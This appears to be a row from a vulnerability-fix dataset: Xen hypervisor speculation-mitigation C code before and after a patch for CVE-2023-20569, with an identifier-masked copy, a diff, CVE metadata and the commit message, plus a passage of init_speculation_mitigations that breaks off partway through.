    if ( boot_cpu_data.extended_cpuid_level >= 0x80000008 )
        cpuid(0x80000008, &tmp, &e8b, &tmp, &tmp);
    if ( boot_cpu_data.extended_cpuid_level >= 0x80000021 )
        cpuid(0x80000021, &e21a, &tmp, &tmp, &tmp);
    if ( cpu_has_arch_caps )
        rdmsrl(MSR_ARCH_CAPABILITIES, caps);

    printk(""Speculative mitigation facilities:\n"");

    /*
     * Hardware read-only information, stating immunity to certain issues, or
     * suggestions of which mitigation to use.
     */
    printk(""  Hardware hints:%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\n"",
           (caps & ARCH_CAPS_RDCL_NO)                        ? "" RDCL_NO""        : """",
           (caps & ARCH_CAPS_EIBRS)                          ? "" EIBRS""          : """",
           (caps & ARCH_CAPS_RSBA)                           ? "" RSBA""           : """",
           (caps & ARCH_CAPS_RRSBA)                          ? "" RRSBA""          : """",
           (caps & ARCH_CAPS_SKIP_L1DFL)                     ? "" SKIP_L1DFL""     : """",
           (e8b  & cpufeat_mask(X86_FEATURE_SSB_NO)) ||
           (caps & ARCH_CAPS_SSB_NO)                         ? "" SSB_NO""         : """",
           (caps & ARCH_CAPS_MDS_NO)                         ? "" MDS_NO""         : """",
           (caps & ARCH_CAPS_TAA_NO)                         ? "" TAA_NO""         : """",
           (caps & ARCH_CAPS_SBDR_SSDP_NO)                   ? "" SBDR_SSDP_NO""   : """",
           (caps & ARCH_CAPS_FBSDP_NO)                       ? "" FBSDP_NO""       : """",
           (caps & ARCH_CAPS_PSDP_NO)                        ? "" PSDP_NO""        : """",
           (caps & ARCH_CAPS_FB_CLEAR)                       ? "" FB_CLEAR""       : """",
           (caps & ARCH_CAPS_PBRSB_NO)                       ? "" PBRSB_NO""       : """",
           (e8b  & cpufeat_mask(X86_FEATURE_IBRS_ALWAYS))    ? "" IBRS_ALWAYS""    : """",
           (e8b  & cpufeat_mask(X86_FEATURE_STIBP_ALWAYS))   ? "" STIBP_ALWAYS""   : """",
           (e8b  & cpufeat_mask(X86_FEATURE_IBRS_FAST))      ? "" IBRS_FAST""      : """",
           (e8b  & cpufeat_mask(X86_FEATURE_IBRS_SAME_MODE)) ? "" IBRS_SAME_MODE"" : """",
           (e8b  & cpufeat_mask(X86_FEATURE_BTC_NO))         ? "" BTC_NO""         : """",
           (e8b  & cpufeat_mask(X86_FEATURE_IBPB_RET))       ? "" IBPB_RET""       : """",
           (e21a & cpufeat_mask(X86_FEATURE_IBPB_BRTYPE))    ? "" IBPB_BRTYPE""    : """",
           (e21a & cpufeat_mask(X86_FEATURE_SRSO_NO))        ? "" SRSO_NO""        : """");

    /* Hardware features which need driving to mitigate issues. */
    printk(""  Hardware features:%s%s%s%s%s%s%s%s%s%s%s%s\n"",
           (e8b  & cpufeat_mask(X86_FEATURE_IBPB)) ||
           (_7d0 & cpufeat_mask(X86_FEATURE_IBRSB))          ? "" IBPB""           : """",
           (e8b  & cpufeat_mask(X86_FEATURE_IBRS)) ||
           (_7d0 & cpufeat_mask(X86_FEATURE_IBRSB))          ? "" IBRS""           : """",
           (e8b  & cpufeat_mask(X86_FEATURE_AMD_STIBP)) ||
           (_7d0 & cpufeat_mask(X86_FEATURE_STIBP))          ? "" STIBP""          : """",
           (e8b  & cpufeat_mask(X86_FEATURE_AMD_SSBD)) ||
           (_7d0 & cpufeat_mask(X86_FEATURE_SSBD))           ? "" SSBD""           : """",
           (_7d2 & cpufeat_mask(X86_FEATURE_INTEL_PSFD)) ||
           (e8b  & cpufeat_mask(X86_FEATURE_PSFD))           ? "" PSFD""           : """",
           (_7d0 & cpufeat_mask(X86_FEATURE_L1D_FLUSH))      ? "" L1D_FLUSH""      : """",
           (_7d0 & cpufeat_mask(X86_FEATURE_MD_CLEAR))       ? "" MD_CLEAR""       : """",
           (_7d0 & cpufeat_mask(X86_FEATURE_SRBDS_CTRL))     ? "" SRBDS_CTRL""     : """",
           (e8b  & cpufeat_mask(X86_FEATURE_VIRT_SSBD))      ? "" VIRT_SSBD""      : """",
           (caps & ARCH_CAPS_TSX_CTRL)                       ? "" TSX_CTRL""       : """",
           (caps & ARCH_CAPS_FB_CLEAR_CTRL)                  ? "" FB_CLEAR_CTRL""  : """",
           (e21a & cpufeat_mask(X86_FEATURE_SBPB))           ? "" SBPB""           : """");

    /* Compiled-in support which pertains to mitigations. */
    if ( IS_ENABLED(CONFIG_INDIRECT_THUNK) || IS_ENABLED(CONFIG_SHADOW_PAGING) )
        printk(""  Compiled-in support:""
#ifdef CONFIG_INDIRECT_THUNK
               "" INDIRECT_THUNK""
#endif
#ifdef CONFIG_SHADOW_PAGING
               "" SHADOW_PAGING""
#endif
               ""\n"");

    /* Settings for Xen's protection, irrespective of guests. */
    printk(""  Xen settings: BTI-Thunk %s, SPEC_CTRL: %s%s%s%s%s, Other:%s%s%s%s%s\n"",
           thunk == THUNK_NONE      ? ""N/A"" :
           thunk == THUNK_RETPOLINE ? ""RETPOLINE"" :
           thunk == THUNK_LFENCE    ? ""LFENCE"" :
           thunk == THUNK_JMP       ? ""JMP"" : ""?"",
           (!boot_cpu_has(X86_FEATURE_IBRSB) &&
            !boot_cpu_has(X86_FEATURE_IBRS))         ? ""No"" :
           (default_xen_spec_ctrl & SPEC_CTRL_IBRS)  ? ""IBRS+"" :  ""IBRS-"",
           (!boot_cpu_has(X86_FEATURE_STIBP) &&
            !boot_cpu_has(X86_FEATURE_AMD_STIBP))    ? """" :
           (default_xen_spec_ctrl & SPEC_CTRL_STIBP) ? "" STIBP+"" : "" STIBP-"",
           (!boot_cpu_has(X86_FEATURE_SSBD) &&
            !boot_cpu_has(X86_FEATURE_AMD_SSBD))     ? """" :
           (default_xen_spec_ctrl & SPEC_CTRL_SSBD)  ? "" SSBD+"" : "" SSBD-"",
           (!boot_cpu_has(X86_FEATURE_PSFD) &&
            !boot_cpu_has(X86_FEATURE_INTEL_PSFD))   ? """" :
           (default_xen_spec_ctrl & SPEC_CTRL_PSFD)  ? "" PSFD+"" : "" PSFD-"",
           !(caps & ARCH_CAPS_TSX_CTRL)              ? """" :
           (opt_tsx & 1)                             ? "" TSX+"" : "" TSX-"",
           !cpu_has_srbds_ctrl                       ? """" :
           opt_srb_lock                              ? "" SRB_LOCK+"" : "" SRB_LOCK-"",
           opt_ibpb_ctxt_switch                      ? "" IBPB-ctxt"" : """",
           opt_l1d_flush                             ? "" L1D_FLUSH"" : """",
           opt_md_clear_pv || opt_md_clear_hvm ||
           opt_fb_clear_mmio                         ? "" VERW""  : """",
           opt_branch_harden                         ? "" BRANCH_HARDEN"" : """");

    /* L1TF diagnostics, printed if vulnerable or PV shadowing is in use. */
    if ( cpu_has_bug_l1tf || opt_pv_l1tf_hwdom || opt_pv_l1tf_domu )
        printk(""  L1TF: believed%s vulnerable, maxphysaddr L1D %u, CPUID %u""
               "", Safe address %""PRIx64""\n"",
               cpu_has_bug_l1tf ? """" : "" not"",
               l1d_maxphysaddr, paddr_bits, l1tf_safe_maddr);

    /*
     * Alternatives blocks for protecting against and/or virtualising
     * mitigation support for guests.
     */
#ifdef CONFIG_HVM
    printk(""  Support for HVM VMs:%s%s%s%s%s%s%s\n"",
           (boot_cpu_has(X86_FEATURE_SC_MSR_HVM) ||
            boot_cpu_has(X86_FEATURE_SC_RSB_HVM) ||
            boot_cpu_has(X86_FEATURE_IBPB_ENTRY_HVM) ||
            amd_virt_spec_ctrl ||
            opt_eager_fpu || opt_md_clear_hvm)       ? """"               : "" None"",
           boot_cpu_has(X86_FEATURE_SC_MSR_HVM)      ? "" MSR_SPEC_CTRL"" : """",
           (boot_cpu_has(X86_FEATURE_SC_MSR_HVM) ||
            amd_virt_spec_ctrl)                      ? "" MSR_VIRT_SPEC_CTRL"" : """",
           boot_cpu_has(X86_FEATURE_SC_RSB_HVM)      ? "" RSB""           : """",
           opt_eager_fpu                             ? "" EAGER_FPU""     : """",
           opt_md_clear_hvm                          ? "" MD_CLEAR""      : """",
           boot_cpu_has(X86_FEATURE_IBPB_ENTRY_HVM)  ? "" IBPB-entry""    : """");

#endif
#ifdef CONFIG_PV
    printk(""  Support for PV VMs:%s%s%s%s%s%s\n"",
           (boot_cpu_has(X86_FEATURE_SC_MSR_PV) ||
            boot_cpu_has(X86_FEATURE_SC_RSB_PV) ||
            boot_cpu_has(X86_FEATURE_IBPB_ENTRY_PV) ||
            opt_eager_fpu || opt_md_clear_pv)        ? """"               : "" None"",
           boot_cpu_has(X86_FEATURE_SC_MSR_PV)       ? "" MSR_SPEC_CTRL"" : """",
           boot_cpu_has(X86_FEATURE_SC_RSB_PV)       ? "" RSB""           : """",
           opt_eager_fpu                             ? "" EAGER_FPU""     : """",
           opt_md_clear_pv                           ? "" MD_CLEAR""      : """",
           boot_cpu_has(X86_FEATURE_IBPB_ENTRY_PV)   ? "" IBPB-entry""    : """");

    printk(""  XPTI (64-bit PV only): Dom0 %s, DomU %s (with%s PCID)\n"",
           opt_xpti_hwdom ? ""enabled"" : ""disabled"",
           opt_xpti_domu  ? ""enabled"" : ""disabled"",
           xpti_pcid_enabled() ? """" : ""out"");

    printk(""  PV L1TF shadowing: Dom0 %s, DomU %s\n"",
           opt_pv_l1tf_hwdom ? ""enabled""  : ""disabled"",
           opt_pv_l1tf_domu  ? ""enabled""  : ""disabled"");
#endif
}","static void __init print_details(enum ind_thunk VAR_0)
{
    unsigned int VAR_1 = 0, VAR_2 = 0, VAR_3 = 0, VAR_4 = 0, VAR_5 = 0, VAR_6;
    uint64_t VAR_7 = 0;

    /* COMMENT_0 */
    if ( VAR_8.cpuid_level >= 7 )
        cpuid_count(7, 0, &VAR_5, &VAR_6, &VAR_6, &VAR_1);
    if ( VAR_5 >= 2 )
        cpuid_count(7, 2, &VAR_6, &VAR_6, &VAR_6, &VAR_2);
    if ( VAR_8.extended_cpuid_level >= 0x80000008 )
        cpuid(0x80000008, &VAR_6, &VAR_3, &VAR_6, &VAR_6);
    if ( VAR_8.extended_cpuid_level >= 0x80000021 )
        cpuid(0x80000021, &VAR_4, &VAR_6, &VAR_6, &VAR_6);
    if ( VAR_9 )
        rdmsrl(VAR_10, VAR_7);

    printk(""Speculative mitigation facilities:\n"");

    /* COMMENT_1 */
                                                                             
                                              
       
    printk(""  Hardware hints:%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\n"",
           (VAR_7 & VAR_11)                        ? "" RDCL_NO""        : """",
           (VAR_7 & VAR_12)                          ? "" EIBRS""          : """",
           (VAR_7 & VAR_13)                           ? "" RSBA""           : """",
           (VAR_7 & VAR_14)                          ? "" RRSBA""          : """",
           (VAR_7 & VAR_15)                     ? "" SKIP_L1DFL""     : """",
           (VAR_3  & cpufeat_mask(VAR_16)) ||
           (VAR_7 & VAR_17)                         ? "" SSB_NO""         : """",
           (VAR_7 & VAR_18)                         ? "" MDS_NO""         : """",
           (VAR_7 & VAR_19)                         ? "" TAA_NO""         : """",
           (VAR_7 & VAR_20)                   ? "" SBDR_SSDP_NO""   : """",
           (VAR_7 & VAR_21)                       ? "" FBSDP_NO""       : """",
           (VAR_7 & VAR_22)                        ? "" PSDP_NO""        : """",
           (VAR_7 & VAR_23)                       ? "" FB_CLEAR""       : """",
           (VAR_7 & VAR_24)                       ? "" PBRSB_NO""       : """",
           (VAR_3  & cpufeat_mask(VAR_25))    ? "" IBRS_ALWAYS""    : """",
           (VAR_3  & cpufeat_mask(VAR_26))   ? "" STIBP_ALWAYS""   : """",
           (VAR_3  & cpufeat_mask(VAR_27))      ? "" IBRS_FAST""      : """",
           (VAR_3  & cpufeat_mask(VAR_28)) ? "" IBRS_SAME_MODE"" : """",
           (VAR_3  & cpufeat_mask(VAR_29))         ? "" BTC_NO""         : """",
           (VAR_3  & cpufeat_mask(VAR_30))       ? "" IBPB_RET""       : """",
           (VAR_4 & cpufeat_mask(VAR_31))    ? "" IBPB_BRTYPE""    : """",
           (VAR_4 & cpufeat_mask(VAR_32))        ? "" SRSO_NO""        : """");

    /* COMMENT_5 */
    printk(""  Hardware features:%s%s%s%s%s%s%s%s%s%s%s%s\n"",
           (VAR_3  & cpufeat_mask(VAR_33)) ||
           (VAR_1 & cpufeat_mask(VAR_34))          ? "" IBPB""           : """",
           (VAR_3  & cpufeat_mask(VAR_35)) ||
           (VAR_1 & cpufeat_mask(VAR_34))          ? "" IBRS""           : """",
           (VAR_3  & cpufeat_mask(VAR_36)) ||
           (VAR_1 & cpufeat_mask(VAR_37))          ? "" STIBP""          : """",
           (VAR_3  & cpufeat_mask(VAR_38)) ||
           (VAR_1 & cpufeat_mask(VAR_39))           ? "" SSBD""           : """",
           (VAR_2 & cpufeat_mask(VAR_40)) ||
           (VAR_3  & cpufeat_mask(VAR_41))           ? "" PSFD""           : """",
           (VAR_1 & cpufeat_mask(VAR_42))      ? "" L1D_FLUSH""      : """",
           (VAR_1 & cpufeat_mask(VAR_43))       ? "" MD_CLEAR""       : """",
           (VAR_1 & cpufeat_mask(VAR_44))     ? "" SRBDS_CTRL""     : """",
           (VAR_3  & cpufeat_mask(VAR_45))      ? "" VIRT_SSBD""      : """",
           (VAR_7 & VAR_46)                       ? "" TSX_CTRL""       : """",
           (VAR_7 & VAR_47)                  ? "" FB_CLEAR_CTRL""  : """",
           (VAR_4 & cpufeat_mask(VAR_48))           ? "" SBPB""           : """");

    /* COMMENT_6 */
    if ( IS_ENABLED(VAR_49) || IS_ENABLED(VAR_50) )
        printk(""  Compiled-in support:""
#ifdef VAR_49
               "" INDIRECT_THUNK""
#endif
#ifdef VAR_50
               "" SHADOW_PAGING""
#endif
               ""\n"");

    /* COMMENT_7 */
    printk(""  Xen settings: BTI-Thunk %s, SPEC_CTRL: %s%s%s%s%s, Other:%s%s%s%s%s\n"",
           VAR_0 == VAR_51      ? ""N/A"" :
           VAR_0 == VAR_52 ? ""RETPOLINE"" :
           VAR_0 == VAR_53    ? ""LFENCE"" :
           VAR_0 == VAR_54       ? ""JMP"" : ""?"",
           (!boot_cpu_has(VAR_34) &&
            !boot_cpu_has(VAR_35))         ? ""No"" :
           (VAR_55 & VAR_56)  ? ""IBRS+"" :  ""IBRS-"",
           (!boot_cpu_has(VAR_37) &&
            !boot_cpu_has(VAR_36))    ? """" :
           (VAR_55 & VAR_57) ? "" STIBP+"" : "" STIBP-"",
           (!boot_cpu_has(VAR_39) &&
            !boot_cpu_has(VAR_38))     ? """" :
           (VAR_55 & VAR_58)  ? "" SSBD+"" : "" SSBD-"",
           (!boot_cpu_has(VAR_41) &&
            !boot_cpu_has(VAR_40))   ? """" :
           (VAR_55 & VAR_59)  ? "" PSFD+"" : "" PSFD-"",
           !(VAR_7 & VAR_46)              ? """" :
           (VAR_60 & 1)                             ? "" TSX+"" : "" TSX-"",
           !VAR_61                       ? """" :
           VAR_62                              ? "" SRB_LOCK+"" : "" SRB_LOCK-"",
           VAR_63                      ? "" IBPB-ctxt"" : """",
           VAR_64                             ? "" L1D_FLUSH"" : """",
           VAR_65 || VAR_66 ||
           VAR_67                         ? "" VERW""  : """",
           VAR_68                         ? "" BRANCH_HARDEN"" : """");

    /* COMMENT_8 */
    if ( VAR_69 || VAR_70 || VAR_71 )
        printk(""  L1TF: believed%s vulnerable, maxphysaddr L1D %u, CPUID %u""
               "", Safe address %""VAR_72""\n"",
               VAR_69 ? """" : "" not"",
               VAR_73, VAR_74, VAR_75);

    /* COMMENT_9 */
                                                                     
                                     
       
#ifdef VAR_76
    printk(""  Support for HVM VMs:%s%s%s%s%s%s%s\n"",
           (boot_cpu_has(VAR_77) ||
            boot_cpu_has(VAR_78) ||
            boot_cpu_has(VAR_79) ||
            VAR_80 ||
            VAR_81 || VAR_66)       ? """"               : "" None"",
           boot_cpu_has(VAR_77)      ? "" MSR_SPEC_CTRL"" : """",
           (boot_cpu_has(VAR_77) ||
            VAR_80)                      ? "" MSR_VIRT_SPEC_CTRL"" : """",
           boot_cpu_has(VAR_78)      ? "" RSB""           : """",
           VAR_81                             ? "" EAGER_FPU""     : """",
           VAR_66                          ? "" MD_CLEAR""      : """",
           boot_cpu_has(VAR_79)  ? "" IBPB-entry""    : """");

#endif
#ifdef VAR_82
    printk(""  Support for PV VMs:%s%s%s%s%s%s\n"",
           (boot_cpu_has(VAR_83) ||
            boot_cpu_has(VAR_84) ||
            boot_cpu_has(VAR_85) ||
            VAR_81 || VAR_65)        ? """"               : "" None"",
           boot_cpu_has(VAR_83)       ? "" MSR_SPEC_CTRL"" : """",
           boot_cpu_has(VAR_84)       ? "" RSB""           : """",
           VAR_81                             ? "" EAGER_FPU""     : """",
           VAR_65                           ? "" MD_CLEAR""      : """",
           boot_cpu_has(VAR_85)   ? "" IBPB-entry""    : """");

    printk(""  XPTI (64-bit PV only): Dom0 %s, DomU %s (with%s PCID)\n"",
           VAR_86 ? ""enabled"" : ""disabled"",
           VAR_87  ? ""enabled"" : ""disabled"",
           xpti_pcid_enabled() ? """" : ""out"");

    printk(""  PV L1TF shadowing: Dom0 %s, DomU %s\n"",
           VAR_70 ? ""enabled""  : ""disabled"",
           VAR_71  ? ""enabled""  : ""disabled"");
#endif
}",,"--- func_before
+++ func_after
@@ -1,6 +1,6 @@
 static void __init print_details(enum ind_thunk thunk)
 {
-    unsigned int _7d0 = 0, _7d2 = 0, e8b = 0, max = 0, tmp;
+    unsigned int _7d0 = 0, _7d2 = 0, e8b = 0, e21a = 0, max = 0, tmp;
     uint64_t caps = 0;
 
     /* Collect diagnostics about available mitigations. */
@@ -10,6 +10,8 @@
         cpuid_count(7, 2, &tmp, &tmp, &tmp, &_7d2);
     if ( boot_cpu_data.extended_cpuid_level >= 0x80000008 )
         cpuid(0x80000008, &tmp, &e8b, &tmp, &tmp);
+    if ( boot_cpu_data.extended_cpuid_level >= 0x80000021 )
+        cpuid(0x80000021, &e21a, &tmp, &tmp, &tmp);
     if ( cpu_has_arch_caps )
         rdmsrl(MSR_ARCH_CAPABILITIES, caps);
 
@@ -19,7 +21,7 @@
      * Hardware read-only information, stating immunity to certain issues, or
      * suggestions of which mitigation to use.
      */
-    printk(""  Hardware hints:%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\n"",
+    printk(""  Hardware hints:%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\n"",
            (caps & ARCH_CAPS_RDCL_NO)                        ? "" RDCL_NO""        : """",
            (caps & ARCH_CAPS_EIBRS)                          ? "" EIBRS""          : """",
            (caps & ARCH_CAPS_RSBA)                           ? "" RSBA""           : """",
@@ -39,10 +41,12 @@
            (e8b  & cpufeat_mask(X86_FEATURE_IBRS_FAST))      ? "" IBRS_FAST""      : """",
            (e8b  & cpufeat_mask(X86_FEATURE_IBRS_SAME_MODE)) ? "" IBRS_SAME_MODE"" : """",
            (e8b  & cpufeat_mask(X86_FEATURE_BTC_NO))         ? "" BTC_NO""         : """",
-           (e8b  & cpufeat_mask(X86_FEATURE_IBPB_RET))       ? "" IBPB_RET""       : """");
+           (e8b  & cpufeat_mask(X86_FEATURE_IBPB_RET))       ? "" IBPB_RET""       : """",
+           (e21a & cpufeat_mask(X86_FEATURE_IBPB_BRTYPE))    ? "" IBPB_BRTYPE""    : """",
+           (e21a & cpufeat_mask(X86_FEATURE_SRSO_NO))        ? "" SRSO_NO""        : """");
 
     /* Hardware features which need driving to mitigate issues. */
-    printk(""  Hardware features:%s%s%s%s%s%s%s%s%s%s%s\n"",
+    printk(""  Hardware features:%s%s%s%s%s%s%s%s%s%s%s%s\n"",
            (e8b  & cpufeat_mask(X86_FEATURE_IBPB)) ||
            (_7d0 & cpufeat_mask(X86_FEATURE_IBRSB))          ? "" IBPB""           : """",
            (e8b  & cpufeat_mask(X86_FEATURE_IBRS)) ||
@@ -58,7 +62,8 @@
            (_7d0 & cpufeat_mask(X86_FEATURE_SRBDS_CTRL))     ? "" SRBDS_CTRL""     : """",
            (e8b  & cpufeat_mask(X86_FEATURE_VIRT_SSBD))      ? "" VIRT_SSBD""      : """",
            (caps & ARCH_CAPS_TSX_CTRL)                       ? "" TSX_CTRL""       : """",
-           (caps & ARCH_CAPS_FB_CLEAR_CTRL)                  ? "" FB_CLEAR_CTRL""  : """");
+           (caps & ARCH_CAPS_FB_CLEAR_CTRL)                  ? "" FB_CLEAR_CTRL""  : """",
+           (e21a & cpufeat_mask(X86_FEATURE_SBPB))           ? "" SBPB""           : """");
 
     /* Compiled-in support which pertains to mitigations. */
     if ( IS_ENABLED(CONFIG_INDIRECT_THUNK) || IS_ENABLED(CONFIG_SHADOW_PAGING) )","{'deleted_lines': ['    unsigned int _7d0 = 0, _7d2 = 0, e8b = 0, max = 0, tmp;', '    printk(""  Hardware hints:%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\\n"",', '           (e8b  & cpufeat_mask(X86_FEATURE_IBPB_RET))       ? "" IBPB_RET""       : """");', '    printk(""  Hardware features:%s%s%s%s%s%s%s%s%s%s%s\\n"",', '           (caps & ARCH_CAPS_FB_CLEAR_CTRL)                  ? "" FB_CLEAR_CTRL""  : """");'], 'added_lines': ['    unsigned int _7d0 = 0, _7d2 = 0, e8b = 0, e21a = 0, max = 0, tmp;', '    if ( boot_cpu_data.extended_cpuid_level >= 0x80000021 )', '        cpuid(0x80000021, &e21a, &tmp, &tmp, &tmp);', '    printk(""  Hardware hints:%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\\n"",', '           (e8b  & cpufeat_mask(X86_FEATURE_IBPB_RET))       ? "" IBPB_RET""       : """",', '           (e21a & cpufeat_mask(X86_FEATURE_IBPB_BRTYPE))    ? "" IBPB_BRTYPE""    : """",', '           (e21a & cpufeat_mask(X86_FEATURE_SRSO_NO))        ? "" SRSO_NO""        : """");', '    printk(""  Hardware features:%s%s%s%s%s%s%s%s%s%s%s%s\\n"",', '           (caps & ARCH_CAPS_FB_CLEAR_CTRL)                  ? "" FB_CLEAR_CTRL""  : """",', '           (e21a & cpufeat_mask(X86_FEATURE_SBPB))           ? "" SBPB""           : """");']}",True,"


A side channel vulnerability on some of the AMD CPUs may allow an attacker to influence the return address prediction. This may result in speculative execution at an attacker-controlledaddress, potentially leading to information disclosure.



















",4.7,MEDIUM,1,valid,2023-06-14T08:13:28Z,4
CVE-2023-20569,['CWE-203'],CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N,1,xen-project/xen,"x86/spec-ctrl: Mitigate Speculative Return Stack Overflow

On native, synthesise the SRSO bits by probing various hardware properties as
given by AMD.

Extend the IBPB-on-entry mitigations to Zen3/4 CPUs.  There is a microcode
prerequisite to make this an effective mitigation.

This is part of XSA-434 / CVE-2023-20569

Signed-off-by: Andrew Cooper <andrew.cooper3@citrix.com>
Reviewed-by: Jan Beulich <jbeulich@suse.com>
Reviewed-by: Roger Pau Monn <roger.pau@citrix.com>",220c06e6fefe2378f40e2a7391f5e265a2aa50f7,https://github.com/xen-project/xen/commit/220c06e6fefe2378f40e2a7391f5e265a2aa50f7,xen/arch/x86/spec_ctrl.c,init_speculation_mitigations,"void __init init_speculation_mitigations(void)
{
enum ind_thunk thunk = THUNK_DEFAULT;
bool has_spec_ctrl, ibrs = false, hw_smt_enabled;
bool cpu_has_bug_taa, retpoline_safe;
hw_smt_enabled = check_smt_enabled();
has_spec_ctrl = (boot_cpu_has(X86_FEATURE_IBRSB) ||
boot_cpu_has(X86_FEATURE_IBRS));
if ( read_cr4() & X86_CR4_CET )
{
if ( !has_spec_ctrl )
{
printk(XENLOG_WARNING ""?!? CET active, but no MSR_SPEC_CTRL?\n"");
add_taint(TAINT_CPU_OUT_OF_SPEC);
}
else if ( opt_ibrs == -1 )
opt_ibrs = ibrs = true;
if ( opt_thunk == THUNK_DEFAULT || opt_thunk == THUNK_RETPOLINE )
thunk = THUNK_JMP;
}
retpoline_safe = retpoline_calculations();
if ( opt_thunk != THUNK_DEFAULT || opt_ibrs != -1 )
{
thunk = opt_thunk;
ibrs  = !!opt_ibrs;
}
else
{
if ( IS_ENABLED(CONFIG_INDIRECT_THUNK) )
{
if ( retpoline_safe )
thunk = THUNK_RETPOLINE;
else if ( has_spec_ctrl )
ibrs = true;
}
else if ( has_spec_ctrl )
ibrs = true;
}
if ( !IS_ENABLED(CONFIG_INDIRECT_THUNK) )
thunk = THUNK_NONE;
if ( ibrs && thunk == THUNK_DEFAULT )
thunk = THUNK_JMP;
if ( thunk == THUNK_DEFAULT )
thunk = THUNK_RETPOLINE;
if ( thunk == THUNK_LFENCE )
setup_force_cpu_cap(X86_FEATURE_IND_THUNK_LFENCE);
else if ( thunk == THUNK_JMP )
setup_force_cpu_cap(X86_FEATURE_IND_THUNK_JMP);
if ( boot_cpu_has(X86_FEATURE_IBRSB) )
{
if ( opt_msr_sc_pv )
{
default_spec_ctrl_flags |= SCF_ist_sc_msr;
setup_force_cpu_cap(X86_FEATURE_SC_MSR_PV);
}
if ( opt_msr_sc_hvm )
{
default_spec_ctrl_flags |= SCF_ist_sc_msr;
setup_force_cpu_cap(X86_FEATURE_SC_MSR_HVM);
}
}
if ( boot_cpu_has(X86_FEATURE_IBRS) )
{
if ( opt_msr_sc_hvm &&
(boot_cpu_data.extended_cpuid_level >= 0x8000000a) &&
(cpuid_edx(0x8000000a) & (1u << SVM_FEATURE_SPEC_CTRL)) )
setup_force_cpu_cap(X86_FEATURE_SC_MSR_HVM);
}
if ( opt_msr_sc_hvm && !cpu_has_amd_ssbd &&
(cpu_has_virt_ssbd || (amd_legacy_ssbd && amd_setup_legacy_ssbd())) )
amd_virt_spec_ctrl = true;
if ( has_spec_ctrl && ibrs )
{
if ( opt_stibp == -1 )
opt_stibp = 1;
default_xen_spec_ctrl |= SPEC_CTRL_IBRS;
}
if ( opt_stibp == -1 )
opt_stibp = !!boot_cpu_has(X86_FEATURE_AMD_STIBP);
if ( opt_stibp && (boot_cpu_has(X86_FEATURE_STIBP) ||
boot_cpu_has(X86_FEATURE_AMD_STIBP)) )
default_xen_spec_ctrl |= SPEC_CTRL_STIBP;
if ( opt_ssbd && (boot_cpu_has(X86_FEATURE_SSBD) ||
boot_cpu_has(X86_FEATURE_AMD_SSBD)) )
{
if ( opt_psfd == -1 )
opt_psfd = 1;
default_xen_spec_ctrl |= SPEC_CTRL_SSBD;
}
if ( opt_psfd == -1 )
opt_psfd = 0;
if ( opt_psfd && (boot_cpu_has(X86_FEATURE_PSFD) ||
boot_cpu_has(X86_FEATURE_INTEL_PSFD)) )
default_xen_spec_ctrl |= SPEC_CTRL_PSFD;
BUILD_BUG_ON(RO_MPT_VIRT_START != PML4_ADDR(256));
if ( opt_rsb_pv == -1 )
{
opt_rsb_pv = (opt_pv32 || !boot_cpu_has(X86_FEATURE_XEN_SMEP) ||
!rsb_is_full_width());
if ( !opt_rsb_pv && hw_smt_enabled &&
(boot_cpu_data.x86_vendor & (X86_VENDOR_AMD|X86_VENDOR_HYGON)) &&
(boot_cpu_data.x86 == 0x17 || boot_cpu_data.x86 == 0x18) )
setup_force_cpu_cap(X86_FEATURE_SC_RSB_IDLE);
}
if ( opt_rsb_pv )
{
setup_force_cpu_cap(X86_FEATURE_SC_RSB_PV);
default_spec_ctrl_flags |= SCF_ist_rsb;
}
if ( opt_rsb_hvm )
{
setup_force_cpu_cap(X86_FEATURE_SC_RSB_HVM);
if ( !cpu_has_svm )
default_spec_ctrl_flags |= SCF_ist_rsb;
}
ibpb_calculations();
if ( opt_eager_fpu == -1 )
opt_eager_fpu = should_use_eager_fpu();
init_shadow_spec_ctrl_state();
if ( boot_cpu_has(X86_FEATURE_IBRSB) && !cpu_has_eibrs &&
hw_smt_enabled && default_xen_spec_ctrl )
setup_force_cpu_cap(X86_FEATURE_SC_MSR_IDLE);
xpti_init_default();
l1tf_calculations();
if ( opt_pv_l1tf_hwdom == -1 )
opt_pv_l1tf_hwdom = 0;
if ( opt_pv_l1tf_domu == -1 )
opt_pv_l1tf_domu = !pv_shim && cpu_has_bug_l1tf;
if ( !boot_cpu_has(X86_FEATURE_L1D_FLUSH) )
opt_l1d_flush = 0;
else if ( opt_l1d_flush == -1 )
opt_l1d_flush = cpu_has_bug_l1tf && !cpu_has_skip_l1dfl;
if ( !opt_branch_harden )
setup_force_cpu_cap(X86_FEATURE_SC_NO_BRANCH_HARDEN);
if ( opt_smt == -1 && cpu_has_bug_l1tf && !pv_shim && hw_smt_enabled )
warning_add(
""Booted on L1TF-vulnerable hardware with SMT/Hyperthreading\n""
""enabled.  Please assess your configuration and choose an\n""
""explicit 'smt=<bool>' setting.  See XSA-273.\n"");
mds_calculations();
if ( opt_unpriv_mmio )
opt_fb_clear_mmio = cpu_has_fb_clear;
if ( opt_md_clear_pv == -1 )
opt_md_clear_pv = ((cpu_has_bug_mds || cpu_has_bug_msbds_only) &&
boot_cpu_has(X86_FEATURE_MD_CLEAR));
if ( opt_md_clear_hvm == -1 )
opt_md_clear_hvm = ((cpu_has_bug_mds || cpu_has_bug_msbds_only) &&
boot_cpu_has(X86_FEATURE_MD_CLEAR));
if ( opt_md_clear_pv || opt_md_clear_hvm || opt_fb_clear_mmio )
setup_force_cpu_cap(X86_FEATURE_SC_VERW_IDLE);
opt_md_clear_hvm &= !cpu_has_skip_l1dfl && !opt_l1d_flush;
if ( opt_smt == -1 && cpu_has_bug_mds && hw_smt_enabled )
warning_add(
""Booted on MLPDS/MFBDS-vulnerable hardware with SMT/Hyperthreading\n""
""enabled.  Mitigations will not be fully effective.  Please\n""
""choose an explicit smt=<bool> setting.  See XSA-297.\n"");
cpu_has_bug_taa =
(cpu_has_rtm || cpu_has_tsx_ctrl) && cpu_has_mds_no && !cpu_has_taa_no;
